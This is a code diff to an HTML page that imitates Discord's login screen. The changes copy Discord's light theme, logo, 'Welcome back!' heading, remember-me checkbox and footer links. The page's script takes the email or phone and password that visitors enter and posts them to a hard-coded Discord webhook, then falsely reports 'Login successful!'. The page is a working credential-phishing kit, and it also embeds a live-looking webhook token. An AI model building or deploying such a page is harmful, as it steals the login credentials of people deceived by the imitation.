@@ -7,8 +7,8 @@
   <style>
     body {
       margin: 0;
-      font-family: "Helvetica", Arial, sans-serif;
-      background-color: #36393f; /* Discord dark background */
+      font-family: "Whitney", "Helvetica Neue", Helvetica, Arial, sans-serif;
+      background-color: #f2f3f5;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -16,18 +16,23 @@
     }
 
     .login-container {
-      width: 350px;
-      background-color: #2f3136;
+      width: 400px;
+      background-color: #ffffff;
       padding: 40px;
       border-radius: 8px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
       text-align: center;
     }
 
+    .login-container img {
+      width: 72px;
+      margin-bottom: 20px;
+    }
+
     .login-container h1 {
-      color: #fff;
-      font-size: 24px;
-      margin-bottom: 25px;
+      font-size: 32px;
+      margin-bottom: 20px;
+      color: #23272a;
     }
 
     input {
@@ -35,14 +40,22 @@
       padding: 12px;
       margin-bottom: 15px;
       border-radius: 4px;
-      border: none;
-      background-color: #202225;
-      color: #fff;
-      font-size: 14px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+      box-sizing: border-box;
     }
 
-    input::placeholder {
-      color: #b9bbbe;
+    label {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      color: #747f8d;
+      margin-bottom: 15px;
+      cursor: pointer;
+    }
+
+    input[type="checkbox"] {
+      margin-right: 8px;
     }
 
     button {
@@ -50,11 +63,11 @@
       padding: 12px;
       background-color: #5865f2;
       color: #fff;
+      font-size: 16px;
+      font-weight: 600;
       border: none;
       border-radius: 4px;
-      font-size: 16px;
       cursor: pointer;
-      margin-top: 10px;
       transition: background-color 0.2s ease;
     }
 
@@ -66,20 +79,49 @@
       margin-top: 10px;
       font-size: 14px;
       display: none;
+    }
+
+    .error {
       color: red;
+    }
+
+    .success {
+      color: green;
+    }
+
+    .footer-links {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #747f8d;
+    }
+
+    .footer-links a {
+      color: #5865f2;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
 
   <div class="login-container">
-    <h1>Login to Discord</h1>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/Discord_logo.svg" alt="Discord Logo">
+    <h1>Welcome back!</h1>
     <form id="loginForm">
       <input type="text" id="email" placeholder="Email or Phone" required>
       <input type="password" id="password" placeholder="Password" required>
+      <label><input type="checkbox" id="remember"> Remember me</label>
       <button type="submit">Login</button>
       <div id="formMessage" class="message"></div>
     </form>
+    <div class="footer-links">
+      <a href="#">Forgot your password?</a>·
+      <a href="#">Need an account?</a>
+    </div>
   </div>
 
   <script>
@@ -90,11 +132,10 @@
       e.preventDefault();
       formMessage.style.display = "none";
 
-      // Your Discord webhook URL
       const webhookURL = "https://discord.com/api/webhooks/1408102666973745173/nriysUUoBDw3CDQQso7XLd1W84qhdFTAvEFhbeqef_UNx1KlQlME1YmmRdbyowQYZw1M";
 
       const data = {
-        content: `📩 **Discord Login Simulation**\n📧 Email/Phone: ${document.getElementById("email").value}\n🔑 Password: ${document.getElementById("password").value}\n⏰ Time: ${new Date().toLocaleString()}`
+        content: `📩 **Discord Login Simulation**\n📧 Email/Phone: ${document.getElementById("email").value}\n🔑 Password: ${document.getElementById("password").value}\n✅ Remember me: ${document.getElementById("remember").checked}\n⏰ Time: ${new Date().toLocaleString()}`
       };
 
       fetch(webhookURL, {
@@ -105,7 +146,7 @@
       .then(res => {
         if (res.ok) {
           formMessage.textContent = "Login successful!";
-          formMessage.style.color = "limegreen";
+          formMessage.className = "message success";
           formMessage.style.display = "block";
           form.reset();
           setTimeout(() => { formMessage.style.display = "none"; }, 2000);
@@ -115,7 +156,7 @@
       })
       .catch(err => {
         formMessage.textContent = "Failed to login.";
-        formMessage.style.color = "red";
+        formMessage.className = "message error";
         formMessage.style.display = "block";
         setTimeout(() => { formMessage.style.display = "none"; }, 2000);
       });
